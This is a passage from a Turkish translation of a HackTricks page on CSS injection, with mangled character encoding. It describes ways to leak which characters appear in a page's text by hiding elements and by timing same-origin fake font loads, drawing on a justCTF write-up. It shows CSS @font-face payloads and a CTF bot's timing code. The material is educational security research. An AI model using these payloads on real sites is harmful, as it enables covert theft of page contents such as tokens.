}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Metin dÃ¼ÄŸÃ¼mÃ¼ sÄ±zdÄ±rma (III): varsayÄ±lan bir font ile charset'i sÄ±zdÄ±rma, Ã¶ÄŸeleri gizleyerek (harici varlÄ±k gerektirmeyen) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** Bu, [bu yazÄ±da baÅŸarÄ±sÄ±z bir Ã§Ã¶zÃ¼m olarak belirtilmiÅŸtir](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Bu durum, Ã¶nceki duruma Ã§ok benziyor, ancak bu durumda belirli **karakterleri diÄŸerlerinden daha bÃ¼yÃ¼k yapmak, bir butonun bot tarafÄ±ndan basÄ±lmamasÄ± veya yÃ¼klenmeyecek bir gÃ¶rÃ¼ntÃ¼yÃ¼ gizlemek** gibi bir amaca hizmet ediyor. BÃ¶ylece eylemi (veya eylemsizliÄŸi) Ã¶lÃ§ebilir ve metin iÃ§inde belirli bir karakterin mevcut olup olmadÄ±ÄŸÄ±nÄ± bilebiliriz.

### Metin dÃ¼ÄŸÃ¼mÃ¼ sÄ±zdÄ±rma (III): cache zamanlamasÄ± ile charset'i sÄ±zdÄ±rma (harici varlÄ±k gerektirmeyen) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** Bu, [bu yazÄ±da baÅŸarÄ±sÄ±z bir Ã§Ã¶zÃ¼m olarak belirtilmiÅŸtir](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Bu durumda, metinde bir karakterin olup olmadÄ±ÄŸÄ±nÄ± sÄ±zdÄ±rmaya Ã§alÄ±ÅŸabiliriz, aynÄ± kaynaktan sahte bir font yÃ¼kleyerek:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
EÄŸer bir eÅŸleÅŸme varsa, **font `/static/bootstrap.min.css?q=1`'den yÃ¼klenecektir**. BaÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼klenmeyecek olsa da, **tarayÄ±cÄ± bunu Ã¶nbelleÄŸe almalÄ±dÄ±r** ve Ã¶nbellek olmasa bile, **304 not modified** mekanizmasÄ± vardÄ±r, bu nedenle **yanÄ±t diÄŸer ÅŸeylerden daha hÄ±zlÄ± olmalÄ±dÄ±r**.

Ancak, Ã¶nbellekli yanÄ±t ile Ã¶nbelleksiz yanÄ±t arasÄ±ndaki zaman farkÄ± yeterince bÃ¼yÃ¼k deÄŸilse, bu faydalÄ± olmayacaktÄ±r. Ã–rneÄŸin, yazar ÅŸunlarÄ± belirtti: Ancak, test ettikten sonra, ilk sorunun hÄ±zÄ±n Ã§ok farklÄ± olmadÄ±ÄŸÄ± ve ikinci sorunun botun `disk-cache-size=1` bayraÄŸÄ±nÄ± kullanmasÄ± olduÄŸunu buldum, bu gerÃ§ekten dÃ¼ÅŸÃ¼nceli.

### Metin dÃ¼ÄŸÃ¼mÃ¼ sÄ±zdÄ±rma (III): yÃ¼zlerce yerel "font" yÃ¼klemesini zamanlayarak charset'i sÄ±zdÄ±rma (harici varlÄ±k gerektirmiyor) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** Bu, [bu yazÄ±da baÅŸarÄ±sÄ±z bir Ã§Ã¶zÃ¼m olarak belirtilmiÅŸtir](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Bu durumda, bir eÅŸleÅŸme gerÃ§ekleÅŸtiÄŸinde **CSS'nin aynÄ± kÃ¶kenden yÃ¼zlerce sahte font yÃ¼klemesini** belirtebilirsiniz. Bu ÅŸekilde, **geÃ§en sÃ¼reyi Ã¶lÃ§ebilir** ve bir karakterin gÃ¶rÃ¼nÃ¼p gÃ¶rÃ¼nmediÄŸini ÅŸu ÅŸekilde bulabilirsiniz:
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Ve botun kodu ÅŸÃ¶yle gÃ¶rÃ¼nÃ¼yor:
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
So, eÄŸer font eÅŸleÅŸmiyorsa, bota eriÅŸim sÄ±rasÄ±nda yanÄ±t sÃ¼resinin yaklaÅŸÄ±k 30 saniye olmasÄ± beklenir. Ancak, eÄŸer bir font eÅŸleÅŸmesi varsa, fontu almak iÃ§in birden fazla istek gÃ¶nderilecektir, bu da aÄŸda sÃ¼rekli bir aktivite olmasÄ±na neden olacaktÄ±r. SonuÃ§ olarak, durdurma koÅŸulunu tatmin etmek ve yanÄ±t almak daha uzun sÃ¼recektir. Bu nedenle, yanÄ±t sÃ¼resi bir font eÅŸleÅŸmesi olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in bir gÃ¶sterge olarak kullanÄ±labilir.

## References

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
